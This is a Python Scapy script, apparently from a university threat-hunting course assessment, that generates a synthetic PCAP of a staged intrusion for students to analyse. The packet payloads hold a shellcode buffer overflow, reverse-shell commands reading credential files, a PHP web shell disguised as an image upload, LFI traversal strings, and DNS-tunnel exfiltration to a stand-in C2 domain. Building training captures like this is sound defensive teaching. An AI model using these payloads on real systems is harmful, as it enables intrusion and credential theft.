#!/usr/bin/env python3
"""
generate_incident_pcap.py
=========================
Genera un PCAP que simula un incidente APT completo con múltiples fases:
1. Reconocimiento (Nmap SYN scan)
2. Exploit de buffer overflow en servicio web
3. Reverse shell
4. Movimiento lateral (SMB)
5. File upload de web shell
6. LFI para leer credenciales
7. Exfiltración via DNS tunneling

EVALUACIÓN PARCIAL 1 - Caso Integrador
Curso MAR404 - Cacería de Amenazas - Clase 4
Universidad Mayor 2026
"""

import os
import random
import base64
import struct
from scapy.all import *

OUTPUT_FILE = "/data/lab8_incident.pcap"

# Escenario
ATTACKER_EXT = "203.0.113.77"      # IP externa del atacante
VICTIM_WEB = "192.168.10.20"       # Servidor web víctima
VICTIM_DB = "192.168.10.30"        # Servidor DB interno
DNS_SERVER = "192.168.10.1"        # DNS interno
C2_DOMAIN = "cdn-update.evil-corp.net"  # Dominio C2


def phase1_reconnaissance():
    """Fase 1: Nmap SYN scan desde IP externa."""
    packets = []
    target_ports = [21, 22, 25, 80, 443, 445, 3306, 8080, 8443, 9200]
    
    for port in target_ports:
        # SYN
        syn = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=random.randint(40000,50000), dport=port, flags="S")
        packets.append(syn)
        
        # Respuestas: open para 22, 80, 8080; closed para el resto
        if port in [22, 80, 8080]:
            sa = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=port, dport=syn[TCP].sport, flags="SA")
            packets.append(sa)
            # RST del scanner
            rst = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=syn[TCP].sport, dport=port, flags="R")
            packets.append(rst)
        else:
            rst = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=port, dport=syn[TCP].sport, flags="RA")
            packets.append(rst)
    
    return packets


def phase2_exploit():
    """Fase 2: Buffer overflow en puerto 8080."""
    packets = []
    sport = 44100
    
    # TCP handshake
    syn = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=sport, dport=8080, flags="S")
    packets.append(syn)
    sa = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=8080, dport=sport, flags="SA")
    packets.append(sa)
    ack = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=sport, dport=8080, flags="A")
    packets.append(ack)
    
    # Exploit payload
    nop_sled = b"\x90" * 256
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    overflow = b"A" * 200 + struct.pack("<I", 0xbffff7a0) + nop_sled + shellcode
    
    http_exploit = b"POST /api/process HTTP/1.1\r\nHost: " + VICTIM_WEB.encode() + b":8080\r\nContent-Length: " + str(len(overflow)).encode() + b"\r\n\r\n" + overflow
    
    exploit_pkt = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=sport, dport=8080, flags="PA")/Raw(load=http_exploit)
    packets.append(exploit_pkt)
    
    # Server crash response
    crash = b"HTTP/1.1 500 Internal Server Error\r\nConnection: close\r\n\r\n"
    crash_pkt = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=8080, dport=sport, flags="PA")/Raw(load=crash)
    packets.append(crash_pkt)
    
    return packets


def phase3_reverse_shell():
    """Fase 3: Reverse shell al atacante."""
    packets = []
    rev_port = random.randint(45000, 48000)
    
    # Conexión reversa desde víctima al atacante
    syn = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=rev_port, dport=4443, flags="S")
    packets.append(syn)
    sa = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=4443, dport=rev_port, flags="SA")
    packets.append(sa)
    ack = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=rev_port, dport=4443, flags="A")
    packets.append(ack)
    
    # Comandos en shell
    commands = [
        (ATTACKER_EXT, "id\n"),
        (VICTIM_WEB, "uid=33(www-data) gid=33(www-data)\n"),
        (ATTACKER_EXT, "whoami\n"),
        (VICTIM_WEB, "www-data\n"),
        (ATTACKER_EXT, "uname -a\n"),
        (VICTIM_WEB, "Linux webserver 5.15.0-91-generic #101-Ubuntu x86_64\n"),
        (ATTACKER_EXT, "cat /etc/passwd | grep -v nologin\n"),
        (VICTIM_WEB, "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\n"),
        (ATTACKER_EXT, "find / -name *.conf -type f 2>/dev/null | head\n"),
        (VICTIM_WEB, "/etc/apache2/sites-enabled/000-default.conf\n/var/www/html/config/database.conf\n"),
        (ATTACKER_EXT, "cat /var/www/html/config/database.conf\n"),
        (VICTIM_WEB, "DB_HOST=192.168.10.30\nDB_USER=webapp\nDB_PASS=Str0ng!P@ss2024\nDB_NAME=production\n"),
    ]
    
    for src_ip, cmd in commands:
        if src_ip == ATTACKER_EXT:
            pkt = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=4443, dport=rev_port, flags="PA")/Raw(load=cmd.encode())
        else:
            pkt = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=rev_port, dport=4443, flags="PA")/Raw(load=cmd.encode())
        packets.append(pkt)
    
    return packets


def phase4_lateral_movement():
    """Fase 4: Movimiento lateral via SMB al servidor DB."""
    packets = []
    sport = 49500
    
    # Conexión SMB desde web server al DB server
    syn = IP(src=VICTIM_WEB, dst=VICTIM_DB)/TCP(sport=sport, dport=445, flags="S")
    packets.append(syn)
    sa = IP(src=VICTIM_DB, dst=VICTIM_WEB)/TCP(sport=445, dport=sport, flags="SA")
    packets.append(sa)
    
    # SMB negotiate
    smb_negotiate = b"\x00\x00\x00\x45\xffSMB\x72\x00\x00\x00\x00\x08\x01\xc0"
    smb_pkt = IP(src=VICTIM_WEB, dst=VICTIM_DB)/TCP(sport=sport, dport=445, flags="PA")/Raw(load=smb_negotiate)
    packets.append(smb_pkt)
    
    return packets


def phase5_webshell_upload():
    """Fase 5: Upload de web shell."""
    packets = []
    sport = 51000
    
    # Upload via HTTP POST
    shell_content = b"<?php if(isset($_REQUEST['cmd'])){echo '<pre>';$cmd=($_REQUEST['cmd']);system($cmd);echo '</pre>';die;}?>"
    boundary = "----WebKitFormBoundaryXyz123"
    body = (
        f"------{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"avatar\"; filename=\"profile.php\"\r\n"
        f"Content-Type: image/jpeg\r\n\r\n"
    ).encode() + b"\xff\xd8\xff\xe0" + shell_content + f"\r\n------{boundary}--\r\n".encode()
    
    headers = (
        f"POST /admin/upload.php HTTP/1.1\r\n"
        f"Host: {VICTIM_WEB}\r\n"
        f"Cookie: admin_session=stolen_session_token_abc123\r\n"
        f"Content-Type: multipart/form-data; boundary=----{boundary}\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode()
    
    upload_pkt = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=sport, dport=80, flags="PA")/Raw(load=headers + body)
    packets.append(upload_pkt)
    
    # Respuesta exitosa
    resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<p>Upload successful: /uploads/profile.php</p>"
    resp_pkt = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=80, dport=sport, flags="PA")/Raw(load=resp)
    packets.append(resp_pkt)
    
    # Ejecución del web shell
    sport2 = 51100
    exec_req = f"GET /uploads/profile.php?cmd=cat%20/etc/shadow HTTP/1.1\r\nHost: {VICTIM_WEB}\r\n\r\n"
    exec_pkt = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=sport2, dport=80, flags="PA")/Raw(load=exec_req.encode())
    packets.append(exec_pkt)
    
    shadow_resp = b"HTTP/1.1 200 OK\r\n\r\n<pre>root:$6$xyz:19000:0:99999:7:::\nadmin:$6$abc:19000:0:99999:7:::</pre>"
    shadow_pkt = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=80, dport=sport2, flags="PA")/Raw(load=shadow_resp)
    packets.append(shadow_pkt)
    
    return packets


def phase6_lfi():
    """Fase 6: LFI para acceder a archivos sensibles."""
    packets = []
    
    lfi_requests = [
        "/page.php?file=../../../etc/passwd",
        "/page.php?file=....//....//....//etc/shadow",
        "/page.php?file=php://filter/convert.base64-encode/resource=/var/www/html/config/database.conf",
    ]
    
    for i, uri in enumerate(lfi_requests):
        sport = 52000 + i
        req = f"GET {uri} HTTP/1.1\r\nHost: {VICTIM_WEB}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        pkt = IP(src=ATTACKER_EXT, dst=VICTIM_WEB)/TCP(sport=sport, dport=80, flags="PA")/Raw(load=req.encode())
        packets.append(pkt)
        
        # Respuesta con contenido sensible
        resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nroot:x:0:0:root:/root:/bin/bash\n"
        resp_pkt = IP(src=VICTIM_WEB, dst=ATTACKER_EXT)/TCP(sport=80, dport=sport, flags="PA")/Raw(load=resp)
        packets.append(resp_pkt)
    
    return packets


def phase7_dns_exfiltration():
    """Fase 7: Exfiltración de datos via DNS tunneling."""
    packets = []
    
    # Datos a exfiltrar (credenciales de DB)
    secret_data = "DB_USER=webapp;DB_PASS=Str0ng!P@ss2024;DB_HOST=192.168.10.30"
    chunks = [secret_data[i:i+30] for i in range(0, len(secret_data), 30)]
    
    for i, chunk in enumerate(chunks):
        encoded = base64.b32encode(chunk.encode()).decode().rstrip("=").lower()
        query_name = f"{encoded}.{i}.data.{C2_DOMAIN}"
        
        # DNS query
        dns_query = IP(src=VICTIM_WEB, dst=DNS_SERVER)/UDP(sport=random.randint(50000,60000), dport=53)/DNS(
            rd=1, qd=DNSQR(qname=query_name, qtype="TXT")
        )
        packets.append(dns_query)
        
        # DNS response
        dns_resp = IP(src=DNS_SERVER, dst=VICTIM_WEB)/UDP(sport=53, dport=dns_query[UDP].sport)/DNS(
            id=dns_query[DNS].id, qr=1, aa=1,
            qd=DNSQR(qname=query_name, qtype="TXT"),
            an=DNSRR(rrname=query_name, type="TXT", rdata="ok")
        )
        packets.append(dns_resp)
    
    return packets


def generate_background_traffic():
    """Genera tráfico de fondo normal."""
    packets = []
    normal_ips = ["192.168.10.50", "192.168.10.51", "192.168.10.52"]
    
    for _ in range(40):
        src = random.choice(normal_ips)
        # DNS queries normales
        domains = ["www.google.com", "mail.office365.com", "github.com", "cdn.jsdelivr.net"]
        domain = random.choice(domains)
        dns_q = IP(src=src, dst=DNS_SERVER)/UDP(sport=random.randint(50000,60000), dport=53)/DNS(
            rd=1, qd=DNSQR(qname=domain, qtype="A")
        )
        packets.append(dns_q)
    
    for _ in range(30):
        src = random.choice(normal_ips)
        sport = random.randint(49152, 65535)
        req = f"GET /index.html HTTP/1.1\r\nHost: {VICTIM_WEB}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n"
        pkt = IP(src=src, dst=VICTIM_WEB)/TCP(sport=sport, dport=80, flags="PA")/Raw(load=req.encode())
        packets.append(pkt)
    
    return packets


def main():
    """Genera el PCAP del incidente completo."""
    os.makedirs("/data", exist_ok=True)
    
    # Generar todas las fases
    background = generate_background_traffic()
    phase1 = phase1_reconnaissance()
    phase2 = phase2_exploit()
    phase3 = phase3_reverse_shell()
    phase4 = phase4_lateral_movement()
    phase5 = phase5_webshell_upload()
    phase6 = phase6_lfi()
    phase7 = phase7_dns_exfiltration()
    
    # Ensamblar en orden cronológico con tráfico de fondo intercalado
    all_packets = []
    
    # Background inicial
    all_packets.extend(background[:10])
    # Fase 1: Reconocimiento
    all_packets.extend(phase1)
    all_packets.extend(background[10:20])
    # Fase 2: Exploit
    all_packets.extend(phase2)
    # Fase 3: Reverse shell
    all_packets.extend(phase3)
    all_packets.extend(background[20:30])
    # Fase 4: Lateral movement
    all_packets.extend(phase4)
    # Fase 5: Web shell
    all_packets.extend(phase5)
    all_packets.extend(background[30:40])
    # Fase 6: LFI
    all_packets.extend(phase6)
    # Fase 7: Exfiltración
    all_packets.extend(phase7)
    # Background final
    all_packets.extend(background[40:])
    
    # Escribir PCAP
    wrpcap(OUTPUT_FILE, all_packets)
    
    total_attack = len(phase1) + len(phase2) + len(phase3) + len(phase4) + len(phase5) + len(phase6) + len(phase7)
    
    print(f"[+] PCAP del incidente generado: {OUTPUT_FILE}")
    print(f"[+] Total paquetes: {len(all_packets)}")
    print(f"[+] Paquetes de ataque: {total_attack}")
    print(f"[+] Paquetes de fondo: {len(background)}")
    print(f"[+] Fases del ataque:")
    print(f"    1. Reconocimiento (SYN scan): {len(phase1)} pkts")
    print(f"    2. Exploit BoF (puerto 8080): {len(phase2)} pkts")
    print(f"    3. Reverse shell (puerto 4443): {len(phase3)} pkts")
    print(f"    4. Lateral movement (SMB): {len(phase4)} pkts")
    print(f"    5. Web shell upload: {len(phase5)} pkts")
    print(f"    6. LFI: {len(phase6)} pkts")
    print(f"    7. DNS exfiltration: {len(phase7)} pkts")
    print(f"[+] Atacante: {ATTACKER_EXT}")
    print(f"[+] Víctima web: {VICTIM_WEB}")
    print(f"[+] Víctima DB: {VICTIM_DB}")
    print(f"[+] C2 domain: {C2_DOMAIN}")


if __name__ == "__main__":
    main()
